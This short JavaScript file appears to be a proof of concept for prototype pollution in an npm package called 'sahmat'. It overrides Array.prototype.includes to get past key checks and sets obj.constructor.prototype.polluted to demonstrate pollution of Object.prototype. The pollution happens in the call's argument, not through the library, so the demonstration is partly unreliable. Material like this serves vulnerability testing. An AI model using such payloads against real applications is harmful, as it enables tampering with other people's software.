Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const sahmat = require('sahmat');
let obj = { tmp: '' };
console.log({}.polluted);
sahmat(obj, 'tmp', obj.constructor.prototype.polluted = 'yes');
console.log('{ ' + obj.tmp.polluted + ', ' + 'yes' + ' }');